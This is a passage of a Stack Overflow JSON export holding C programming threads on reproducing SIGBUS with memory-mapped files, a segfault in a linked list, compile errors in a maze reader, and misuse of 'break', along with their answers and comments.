"https://stackoverflow.com/users/1093528/fge"}, "edited": false, "score": 0, "creation_date": 1457549727, "post_id": 35900166, "comment_id": 59460882, "body": "This looks like the answer I was looking for... Would you mind posting a link to the extract you posted above?"}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 109504, "user_id": 1093528, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/VjxwC.jpg?s=128&g=1", "display_name": "fge", "link": "https://stackoverflow.com/users/1093528/fge"}, "edited": false, "score": 0, "creation_date": 1457550704, "post_id": 35900166, "comment_id": 59461526, "body": "Oh yeah, I totally forgot."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 109504, "user_id": 1093528, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/VjxwC.jpg?s=128&g=1", "display_name": "fge", "link": "https://stackoverflow.com/users/1093528/fge"}, "edited": false, "score": 0, "creation_date": 1457551541, "post_id": 35900166, "comment_id": 59462026, "body": "@fge I added the desired reference."}], "tags": [], "owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "is_accepted": true, "score": 2, "last_activity_date": 1457550748, "last_edit_date": 1457550748, "creation_date": 1457549526, "answer_id": 35900166, "question_id": 35899950, "link": "https://stackoverflow.com/questions/35899950/does-there-exist-a-surefire-cross-platform-way-to-reproduce-a-sigbus/35900166#35900166", "title": "Does there exist a surefire, cross platform way to reproduce a SIGBUS?", "body": "<p><code>SIGBUS</code> is one of the perils of using memory mapped files. <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/mmap.html\" rel=\"nofollow\">According to POSIX</a>, you get a SIGBUS with respect to <code>mmap()</code> in the following conditions:</p>\n\n<blockquote>\n  <p>The system shall always zero-fill any partial page at the end of an object. Further, the system shall never write out any modified portions of the last page of an object which are beyond its end. References within the address range starting at pa and continuing for len bytes to whole pages following the end of an object shall result in delivery of a SIGBUS signal.</p>\n  \n  <p>An implementation may generate SIGBUS signals when a reference would cause an error in the mapped object, such as out-of-space condition.</p>\n</blockquote>\n\n<p>In your example, the object referred to by <code>fd</code> has a length of 0 bytes. All pages of the mapping are therefore \u201cwhole pages following the end of an object\u201d and generate a SIGBUS on access.</p>\n\n<p>You can avoid a <code>SIGBUS</code> by not mapping more pages than the object is long. Sadly, there is an inherent problem with <code>MAP_SHARED</code>: Even when the length of the mapping was verified to be correct on <code>mmap()</code>, the object size may change afterwards (e.g. if another process calls <code>truncate()</code> on the file).</p>\n\n<p>Generally, you always get a <code>SIGBUS</code> when you access a page that is not mapped. Linux generates <code>SIGSEGV</code> in some of these cases, as the semantics overlap. <code>SIGSEGV</code> should be generated when a page is accessed in a forbidden way.</p>\n"}], "owner": {"reputation": 109504, "user_id": 1093528, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/VjxwC.jpg?s=128&g=1", "display_name": "fge", "link": "https://stackoverflow.com/users/1093528/fge"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 285, "favorite_count": 0, "accepted_answer_id": 35900166, "answer_count": 2, "score": 3, "last_activity_date": 1457550748, "creation_date": 1457548867, "last_edit_date": 1610973356, "question_id": 35899950, "link": "https://stackoverflow.com/questions/35899950/does-there-exist-a-surefire-cross-platform-way-to-reproduce-a-sigbus", "title": "Does there exist a surefire, cross platform way to reproduce a SIGBUS?", "body": "<p>This question is out of pure curiosity; personally I have seen this signal being raised, but only rarely so.</p>\n<p>I asked on <a href=\"https://chat.stackoverflow.com/rooms/54304/c\">the C chatroom</a> whether there was a reliable way to reproduce it. And on this very room, <a href=\"https://chat.stackoverflow.com/users/918959\">user @Antti Haapala</a> found one. At least on Linux x86_64 systems... And after some fiddling around, the same pattern was reproducible with three languages -- however, only on x86_64 Linux based systems since these were the only systems this could be tested on... Here's how:</p>\n<h2>C</h2>\n<pre><code>$ cat t.c\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/mman.h&gt;\n\nint main () {\n        int fd = open (&quot;empty&quot;, O_RDONLY);\n        char *p = mmap (0, 40960, PROT_READ, MAP_SHARED, fd, 0);\n        printf(&quot;%c\\n&quot;, p[4096]);\n}\n$ :&gt;empty\n$ gcc t.c\n$ ./a.out\nBus error (core dumped)\n</code></pre>\n<h2>Python</h2>\n<pre><code>$ cat t.py\nimport mmap\nimport re\nimport os\n\nwith open('empty', 'wb') as f:\n    f.write(b'a' * 4096)\n\nwith open('empty', 'rb') as f:\n    # memory-map the file, size 0 means whole file\n    mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)\n\n    os.system('truncate --size 0 empty')\n\n    b'123' in mm\n$ python t.py\nBus error (core dumped)\n</code></pre>\n<h2>Java</h2>\n<pre><code>$ cat Test.java\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Random;\n\npublic final class Test\n{\n    private static final int SIZE = 4096;\n    private static final Path VICTIM = Paths.get(&quot;/tmp/somefile&quot;);\n\n    public static void main(final String... args)\n        throws IOException\n    {\n        // Create our victim; delete it first if it already exsists\n        Files.deleteIfExists(VICTIM);\n        Files.createFile(VICTIM);\n\n        final Random rnd = new Random();\n        final byte[] contents = new byte[SIZE];\n        rnd.nextBytes(contents);\n        Files.write(VICTIM, contents);\n\n        try (\n            final FileChannel channel = FileChannel.open(VICTIM,\n                StandardOpenOption.READ, StandardOpenOption.WRITE);\n        ) {\n            final MappedByteBuffer buffer\n                = channel.map(FileChannel.MapMode.READ_ONLY, 0L, SIZE);\n            channel.truncate(0L);\n            buffer.get(rnd.nextInt(SIZE));\n        }\n    }\n}\n$ javac Test.java\n$ strace -ff -o TRACE java Test\nException in thread &quot;main&quot; java.lang.InternalError: a fault occurred in a recent unsafe memory access operation in compiled Java code\n    at Test.main(Test.java:35)\nfge@erwin:~/tmp$ grep -w SIGBUS TRACE.*\nTRACE.15850:rt_sigaction(SIGBUS, NULL, {SIG_DFL, [], 0}, 8) = 0\nTRACE.15850:rt_sigaction(SIGBUS, {0x7fe3db71b480, ~[RTMIN RT_1], SA_RESTORER|SA_RESTART|SA_SIGINFO, 0x7fe3dc5d7d10}, {SIG_DFL, [], 0}, 8) = 0\nTRACE.15850:--- SIGBUS {si_signo=SIGBUS, si_code=BUS_ADRERR, si_addr=0x7fe3dc9fb5aa} ---\n</code></pre>\n<p>Again: all the examples above are only on Linux x86_64 systems; I have nothing else at my disposal.</p>\n<p>Would there be a way to reproduce this on other systems?</p>\n<p>Side questions: if the examples above were reproducible on systems not having <code>SIGBUS</code>, what would happen?</p>\n"}, {"tags": ["c", "pointers", "linked-list", "stack"], "answers": [{"tags": [], "owner": {"reputation": 999, "user_id": 5668691, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51b2f0199abaed8efe849372dc60bb35?s=128&d=identicon&r=PG&f=1", "display_name": "Sudipta Kumar Sahoo", "link": "https://stackoverflow.com/users/5668691/sudipta-kumar-sahoo"}, "is_accepted": false, "score": 0, "last_activity_date": 1457547730, "creation_date": 1457547730, "answer_id": 35899574, "question_id": 35899360, "link": "https://stackoverflow.com/questions/35899360/linked-list-c-with-pointers/35899574#35899574", "title": "Linked List C with pointers", "body": "<p>You are not assigning the <code>pFirst</code> value, so it is having garbage data, which is not equal to <code>NULL</code>.\nModify your code like this;</p>\n\n<pre><code>void insHead(ListaLibri lista)\n{\n    // Your code goes here\n\n    lista.pFirst = NULL;\n    if(lista.pFirst == NULL)\n    {\n        // Your code goes here\n    }\n    printList(&amp;lista); //Pass it as a reference, because printList() input parameter is a pointer type.\n}\n</code></pre>\n\n<p>Hope this helps.</p>\n"}, {"tags": [], "owner": {"reputation": 81, "user_id": 3125979, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2AFKV.png?s=128&g=1", "display_name": "jbmillard", "link": "https://stackoverflow.com/users/3125979/jbmillard"}, "is_accepted": false, "score": 0, "last_activity_date": 1457547862, "creation_date": 1457547862, "answer_id": 35899615, "question_id": 35899360, "link": "https://stackoverflow.com/questions/35899360/linked-list-c-with-pointers/35899615#35899615", "title": "Linked List C with pointers", "body": "<p>You declare lista in main, but you don't initialize any fields.  My guess is that lista.pFirst is non-NULL garbage and you if is then skipped.</p>\n"}, {"tags": [], "owner": {"reputation": 138000, "user_id": 5577765, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LoGpC.jpg?s=128&g=1", "display_name": "Rabbid76", "link": "https://stackoverflow.com/users/5577765/rabbid76"}, "is_accepted": true, "score": 0, "last_activity_date": 1457549235, "last_edit_date": 1457549235, "creation_date": 1457548201, "answer_id": 35899713, "question_id": 35899360, "link": "https://stackoverflow.com/questions/35899360/linked-list-c-with-pointers/35899713#35899713", "title": "Linked List C with pointers", "body": "<p>First of all you have to initialize <code>lista.pFirst</code> and <code>lista.pLast</code> with <code>NULL</code>.  </p>\n\n<pre><code>int main()\n{\n    ListaLibri lista;\n    lista.pFirst = NULL;  // &lt;- init NULL\n    lista.pLast = NULL;   // &lt;- init NULL\n\n    insHead( &amp;lista );    // &lt;- pass pointer to list to function insHead\n    insHead( &amp;lista );\n    .....       \n\n    deleteList( &amp;lista ); \n    return 0;\n}\n</code></pre>\n\n<p>The input paramter to your function <code>insHead</code> has to be an in and output paramter. Otherwise you would pass an copy of <code>lista</code> to function <code>insHead</code> and never get back its content.</p>\n\n<pre><code>void insHead( ListaLibri *lista )\n                     // ^ input and outout paramter\n{\n    if ( lista == NULL )\n        return;\n\n    Cella *head = lista-&gt;pFirst;           // remember head of list\n    lista-&gt;pFirst = malloc(sizeof(Cella)); // allocate new node right to target\n    lista-&gt;pFirst-&gt;pNext = head;           // successor of new node is head of list\n    if ( lista-&gt;pLast == NULL )            // if list was empty new node is tail of list\n        lista-&gt;pLast = lista-&gt;pFirst;\n\n    Libro libro;\n    printf(\"Inserisci titolo libro: \");\n    scanf(\"%s\",  libro.titolo);\n    printf(\"Inserisci autore libro: \");\n    scanf(\"%s\",  libro.autore);\n    printf(\"Inserisci il numero di copie presenti in libreria: \");\n    scanf(\"%d\",&amp;libro.inLibreria);\n    lista-&gt;pFirst-&gt;libro = libro;\n\n    printList( lista );\n}\n</code></pre>\n\n<p>Don't delete nodes infunction print. </p>\n\n<pre><code>void printList(ListaLibri *lista)\n{\n    if ( lista == NULL )\n        return;\n\n    Pcella temp = lista-&gt;pFirst;\n    while (temp != NULL)\n    {\n        printf(\"%s\\n\", temp-&gt;libro.autore);\n        temp = temp-&gt;pNext;\n    }\n}\n</code></pre>\n\n<p>Write a function which deletes the list.</p>\n\n<pre><code>void deleteList(ListaLibri *lista)\n{\n    if ( lista == NULL )\n        return;\n\n    Pcella temp = lista-&gt;pFirst;\n    while (temp != NULL)           // terminate if tail of list is reached\n    {\n        Pcella next = temp-&gt;pNext; // rmember successor of node\n        free( temp );              // delete node\n        temp = next;               // go to next node\n    }\n    lista-&gt;pFirst = NULL;\n    lista-&gt;pLast = NULL;\n}\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 3799544, "user_type": "registered", "profile_image": "https://graph.facebook.com/1215783908/picture?type=large", "display_name": "user3799544", "link": "https://stackoverflow.com/users/3799544/user3799544"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 89, "favorite_count": 0, "accepted_answer_id": 35899713, "answer_count": 3, "score": 0, "last_activity_date": 1457553944, "creation_date": 1457547105, "last_edit_date": 1457553944, "question_id": 35899360, "link": "https://stackoverflow.com/questions/35899360/linked-list-c-with-pointers", "title": "Linked List C with pointers", "body": "<p>I'm trying to push an element in a linked list, then print it but the problem received is: <code>segmentation fault</code>.</p>\n\n<p>I've created struct <code>libro</code>, <code>cella</code> and <code>lista</code>. Then in function <code>insHead</code> i've tried to insert an element to the list, taking input from user and then in function <code>printList</code> (and here i've got the segmentation fault) i would print list's elements.</p>\n\n<p>The code is:</p>\n\n<pre><code>typedef struct libro {\n    char titolo[64];\n    char autore[32];\n    short inLibreria;\n    short fuoriLibreria;\n    short id;\n} Libro;\n\ntypedef struct cella {\n    Libro libro;\n    struct cella *pNext;\n} Cella;\n\ntypedef Cella *Pcella;\n\ntypedef struct listaLibri{\n    Cella *pFirst;\n    Cella *pLast;\n} ListaLibri;\n\nvoid insHead(ListaLibri lista){\n    Pcella cella;\n    Libro libro;\n    printf(\"Inserisci titolo libro: \");\n    scanf(\"%s\",  libro.titolo);\n    printf(\"Inserisci autore libro: \");\n    scanf(\"%s\",  libro.autore);\n    printf(\"Inserisci il numero di copie presenti in libreria: \");\n    scanf(\"%d\",&amp;libro.inLibreria);\n    if(lista.pFirst == NULL){\n        cella = NULL;\n        Pcella temp = cella;\n        cella = malloc(sizeof(Cella));\n        (*cella).libro = libro;\n        (*cella).pNext = temp;\n        lista.pFirst = cella;\n        lista.pLast = cella;\n    }\n    printList(lista);\n}\n\nvoid printList(ListaLibri *lista){\n    Pcella cella = lista-&gt;pFirst;\n    Pcella temp = cella;\n    while (temp != NULL){\n        printf(\"%s\", temp-&gt;libro.autore);\n        temp = temp-&gt;pNext;\n    }\n    free(cella);\n    free(temp);\n}\n\nvoid main(){\n    ListaLibri lista;\n    insHead(lista);\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "struct", "maze"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1457547711, "post_id": 35899290, "comment_id": 59459568, "body": "You have statements outside of functions. You need a good C book."}, {"owner": {"reputation": 7, "user_id": 5995122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/937d1932c389aa840848c2b412d42062?s=128&d=identicon&r=PG&f=1", "display_name": "Mags", "link": "https://stackoverflow.com/users/5995122/mags"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457549653, "post_id": 35899290, "comment_id": 59460828, "body": "Any recommendations for one online? I am doing this for a class and we are not really using a book at all. However I think I am making some good progress went from 10 errors to 6 now."}, {"owner": {"reputation": 39687, "user_id": 79566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/edad7f3ab41c3bdfdf851759dce5c33b?s=128&d=identicon&r=PG", "display_name": "bta", "link": "https://stackoverflow.com/users/79566/bta"}, "edited": false, "score": 0, "creation_date": 1457549665, "post_id": 35899290, "comment_id": 59460840, "body": "A hint: drop the &quot;register&quot; keywords.  They&#39;re rarely needed, and probably aren&#39;t doing what you think they&#39;re doing.  They&#39;re also causing a lot of your <a href=\"http://ideone.com/sVzwWy\" rel=\"nofollow noreferrer\">compiler errors</a>."}, {"owner": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 0, "creation_date": 1457552427, "post_id": 35899290, "comment_id": 59462550, "body": "You should define CELL ( which is basically... a char?) before using it in MAZE. In ReadMaze the condition <code>(MAZE *)0 == pMQRet = malloc(sizeof(MAZE)*1)</code> is nonsense, use malloc (without *1) before the if and then check for <code>!pMQRet</code> otherwise you will execute the if branch whith a null pointer, and what is EXIT_FAILURE?"}, {"owner": {"reputation": 726, "user_id": 5699135, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ELexL.png?s=128&g=1", "display_name": "birdoftheday", "link": "https://stackoverflow.com/users/5699135/birdoftheday"}, "edited": false, "score": 0, "creation_date": 1457553250, "post_id": 35899290, "comment_id": 59463038, "body": "@Mags IMO there aren&#39;t really any good C books online. If you plan to really get into C, you should read <a href=\"https://rads.stackoverflow.com/amzn/click/com/0131103628\" rel=\"nofollow noreferrer\" rel=\"nofollow noreferrer\">the c programming language</a> and friends"}, {"owner": {"reputation": 7, "user_id": 5995122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/937d1932c389aa840848c2b412d42062?s=128&d=identicon&r=PG&f=1", "display_name": "Mags", "link": "https://stackoverflow.com/users/5995122/mags"}, "reply_to_user": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 0, "creation_date": 1457639786, "post_id": 35899290, "comment_id": 59510373, "body": "I will definitely take a look at these books. @Bob__ When using Xcode I was going to just exit 0; It auto filled it with EXIT_FAILURE, so I just went with it for now. I assumed it was almost the same thing."}], "answers": [{"comments": [{"owner": {"reputation": 7, "user_id": 5995122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/937d1932c389aa840848c2b412d42062?s=128&d=identicon&r=PG&f=1", "display_name": "Mags", "link": "https://stackoverflow.com/users/5995122/mags"}, "edited": false, "score": 0, "creation_date": 1457639649, "post_id": 35901309, "comment_id": 59510292, "body": "I can see some issues that I was having from my original code post. I thank you for the structuring of all this. If I have those functions above main, but I wanted to make a call to open up the actual file would I call something from PrintMaze or ReadMaze? I was trying to call down *fpIn to open, however it was not opening any of the files. Would I instead need to call the whole function down to open up the file using argv[ ]?"}, {"owner": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "reply_to_user": {"reputation": 7, "user_id": 5995122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/937d1932c389aa840848c2b412d42062?s=128&d=identicon&r=PG&f=1", "display_name": "Mags", "link": "https://stackoverflow.com/users/5995122/mags"}, "edited": false, "score": 0, "creation_date": 1457640411, "post_id": 35901309, "comment_id": 59510807, "body": "I&#39;m not sure what you&#39;re asking.  I would expect <code>main()</code> or something it invokes to call <code>ReadMaze()</code> once to read in the maze.  (Assuming there is only one maze, otherwise your game controller function might call <code>ReadMaze()</code> on every new game.)  I suggest you close off this question as answered and open a new one, if needed, with your question and what code you have so far to control the actual play of the game.  You can still reference this question for those who need more detail."}], "tags": [], "owner": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "is_accepted": true, "score": 0, "last_activity_date": 1457553136, "creation_date": 1457553136, "answer_id": 35901309, "question_id": 35899290, "link": "https://stackoverflow.com/questions/35899290/struct-errors-with-mazes/35901309#35901309", "title": "Struct errors with mazes", "body": "<p>As best as I can decipher, this rework of your code should compile -- I'm not saying it should work, but it should compile and give you a leg up on a working version:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct CEnode {\n    char cglyph;\n} CELL;\n\ntypedef struct MQnode {\n    CELL **ppCE;\n    int iRows, iCols, iGoals, iStarts;\n} MAZE;\n\nMAZE *\nReadMaze(FILE *fpIn)\n{\n    int j, k, c;\n    MAZE *pMQRet;\n\n    if ((MAZE *)0 == (pMQRet = malloc(sizeof(MAZE))))\n    {\n        exit(EXIT_FAILURE);\n    }\n\n    if (2 != fscanf(fpIn, \" %d,%d\\n\", &amp;pMQRet-&gt;iRows, &amp;pMQRet-&gt;iCols))\n    {\n        exit(EXIT_FAILURE);\n    }\n\n    if (2 &gt; pMQRet-&gt;iRows || 2 &gt; pMQRet-&gt;iCols)\n    {\n        exit(EXIT_FAILURE);\n    }\n\n    if ((CELL **)0 == (pMQRet-&gt;ppCE = malloc(sizeof(CELL *) * pMQRet-&gt;iRows)))\n    {\n        exit(EXIT_FAILURE);\n    }\n\n    // initialize goals and starts\n\n    for (j = 0; j &lt; pMQRet-&gt;iRows; j++)\n    {\n        if ((CELL*)0 == (pMQRet-&gt;ppCE[j] = malloc(sizeof(CELL) * pMQRet-&gt;iCols + 1)))\n        {\n            exit(EXIT_FAILURE);\n        }\n\n        for (k = 0; k &lt; pMQRet-&gt;iCols + 1; k++)\n        {\n            if (EOF == (c = fgetc(fpIn)))\n            {\n                exit(EXIT_FAILURE);\n            }\n\n            pMQRet-&gt;ppCE[j][k].cglyph = c;\n        }\n    }\n\n    return pMQRet;\n}\n\nvoid\nPrintMaze(FILE *fpout, MAZE *pMQThis)\n{\n    int j, k, l;\n    CELL *pCE;\n\n    if ((MAZE *)0 == pMQThis)\n    {\n        exit(EXIT_FAILURE);\n    }\n\n    for (l = 0; l &lt; pMQThis-&gt;iCols + 2; l++)\n    {\n        fputc('-', fpout);\n    }\n\n    for (j = 0; j &lt; pMQThis-&gt;iRows; j++)\n    {\n        pCE = pMQThis-&gt;ppCE[j];\n\n        fputc('|', fpout);\n\n        for (k = 0; k &lt; pMQThis-&gt;iCols; k++)\n        {\n            fputc(pCE[k].cglyph, fpout);\n        }\n\n        fputc('|', fpout);\n        fputc('\\n', fpout);\n    }\n\n    for (l = 0; l &lt; pMQThis-&gt;iCols + 2; l++)\n    {\n        fputc('-', fpout);\n    }\n}\n\nint main(int argc, const char *argv[]) {\n\n} // end of main\n</code></pre>\n\n<p>My recommendation is you write and test smaller blocks of code as you build up to larger ones.  Good luck.</p>\n"}], "owner": {"reputation": 7, "user_id": 5995122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/937d1932c389aa840848c2b412d42062?s=128&d=identicon&r=PG&f=1", "display_name": "Mags", "link": "https://stackoverflow.com/users/5995122/mags"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 169, "favorite_count": 0, "accepted_answer_id": 35901309, "answer_count": 1, "score": 0, "last_activity_date": 1457553136, "creation_date": 1457546867, "question_id": 35899290, "link": "https://stackoverflow.com/questions/35899290/struct-errors-with-mazes", "title": "Struct errors with mazes", "body": "<p>I am writing a program to read a maze from a text file and pass it through some structs. It is supposed to go through the structs get read out line by line finding errors if the maze is too short or contains an odd character inside of it. Once it passes all the requirements it then is printed out, but with a border surrounding it with( - and | ). </p>\n\n<p>However there were some errors, I first had the \"function declaration is not allowed here\" error. So I moved the whole program above main and got more errors. I feel like it is because of the parentheses that I might need to fix. I was also noticing that in some areas it would not recognize iRows which was initialized inside of a struct. Not exactly sure what is going on there since it is recognizing iCols just fine.</p>\n\n<p>When I am calling CELL into my first struct why is it not recognizing it at all? Do I need to make it an int or define it as a struct so it can read it?</p>\n\n<p>I Still am trying to debug everything just thought I would bring it over to have some insight. Some of my pointers are not working and I have gone through and fixed some errors, I just can't seem to be able to fix these ones.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct MQnode {\n    CELL **ppCE;\n    int iRows, iCols, iGoals, iStarts;\n}MAZE;\n\ntypedef struct CEnode {\n    char cglyph;\n\n}CELL;\n\nMAZE *\nReadMaze(FILE *fpIn)\n{\n    register int j, k, c;\n    register MAZE *pMQRet;\n\n    if ((MAZE *)0 == pMQRet = malloc(sizeof(MAZE)*1)) {\n        if (2 != fscanf(fpIn, \" %d,%d\\n\", &amp;pMQRet-&gt;iRows, &amp;pMQRet-&gt;iCols))  {\n            EXIT_FAILURE;\n        }\n\n        if (2 &gt; pMQRet-&gt;iRows || 2 &gt; pMQRet-&gt;iCols) {\n            EXIT_FAILURE;\n        }\n\n        if ((CELL *)0 == (pMQRet-&gt;ppCE = malloc(sizeof(CELL *)*iRows))) {\n            EXIT_FAILURE;\n        }\n        //intialize goals and starts\n\n        for (j=0; j&lt;iRows;++j){\n            if ((CELL*)0 == pMQRet-&gt;ppCE[j] = malloc((pMQRet-&gt;iCols+1)* sizeof(CELL))){\n                EXIT_FAILURE;\n            }\n            for (k=0; k&lt;pMQRet-&gt;iCols+1;++k){\n                if (EOF ==(c = fgetc(fpIn))){\n                    EXIT_FAILURE;\n                }\n\n            }\n        }ppCE[j][k] = c;\n    }\n}return pMQRet;\n\n\nvoid\nPrintMaze(FILE *fpout, MAZE *pMQThis)\n{\n    register int j,k,l;\n    register CELL *pCE;\n    if ((MAZE *)0 == pMQThis){\n        exit(0);\n    }\n    for (l=0;l&lt;pMQThis-&gt;iCols+2;++1)\n        fputc('-',fpout);\n    for (j=0;j&lt;pMQThis-&gt;iRows;++j){\n        pCE = pMQThis-&gt;ppCE[j];\n        fputc('|',fpout);\n        for (k=0; k&lt;pMQThis-&gt;iCols;++k)\n            fputc(pCE[k], cglyph,fpout);\n    }\n    fputc('|',fpout);\n    fputc('\\n',fpout);\n}\nfputc('-',fpout);\nreturn pCE;\n\n\nint main(int argc, const char * argv[]) {\n\n\n}//end of main\n</code></pre>\n"}, {"tags": ["c", "if-statement", "break"], "comments": [{"owner": {"reputation": 44996, "user_id": 4987285, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/7063d966c8dfa84aefbd06786824090e?s=128&d=identicon&r=PG", "display_name": "skypjack", "link": "https://stackoverflow.com/users/4987285/skypjack"}, "edited": false, "score": 4, "creation_date": 1457546434, "post_id": 35899100, "comment_id": 59458792, "body": "Actually, the errors are all right. What&#39;s the problem?"}, {"owner": {"reputation": 147720, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1457546506, "post_id": 35899100, "comment_id": 59458846, "body": "What do you think <code>break == 1</code> means?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 3, "creation_date": 1457546523, "post_id": 35899100, "comment_id": 59458857, "body": "<code>break</code> is not a variable, you cannot compare it. It is an instruction."}, {"owner": {"reputation": 101, "user_id": 5880647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a4d51a58fd40bac0201d68a62d9f427?s=128&d=identicon&r=PG&f=1", "display_name": "origimbo", "link": "https://stackoverflow.com/users/5880647/origimbo"}, "edited": false, "score": 1, "creation_date": 1457546578, "post_id": 35899100, "comment_id": 59458889, "body": "I think the c standard uses the terminology of &quot;statement&quot;."}, {"owner": {"reputation": 1305, "user_id": 4070984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/baf1830194e35e5efadc5a078c76b217?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/4070984/ben"}, "edited": false, "score": 0, "creation_date": 1457546920, "post_id": 35899100, "comment_id": 59459070, "body": "&quot;I didnt use break as a variable. I tried to do this: If the break in for was executed, break here too.&quot; Where did you get the idea that this ought to work?"}, {"owner": {"reputation": 465, "user_id": 4109266, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/fA4Tx.jpg?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/4109266/michael"}, "reply_to_user": {"reputation": 1305, "user_id": 4070984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/baf1830194e35e5efadc5a078c76b217?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/4070984/ben"}, "edited": false, "score": 0, "creation_date": 1457548104, "post_id": 35899100, "comment_id": 59459810, "body": "@Ben i just remember using this few years ago. I wanted to know if this was a true or false idea. Thats why i asked."}, {"owner": {"reputation": 308, "user_id": 5937167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Iis5J.png?s=128&g=1", "display_name": "Dave the Sax", "link": "https://stackoverflow.com/users/5937167/dave-the-sax"}, "edited": false, "score": 0, "creation_date": 1457557198, "post_id": 35899100, "comment_id": 59465325, "body": "You&#39;ll need to give more details about this mysterious memory of yours.  Like: what version of what compiler were you using, and can you reproduce the expected behaviour with a small test program.  Anyway, regardless of what you remember, NOW you cannot do that [any more]; it&#39;s a syntax error.  So if you can&#39;t expand on that memory, you&#39;ll just have to chalk it down to one of life&#39;s little mysteries.  Certainly nobody here will be able to explain why it worked before."}], "answers": [{"comments": [{"owner": {"reputation": 27420, 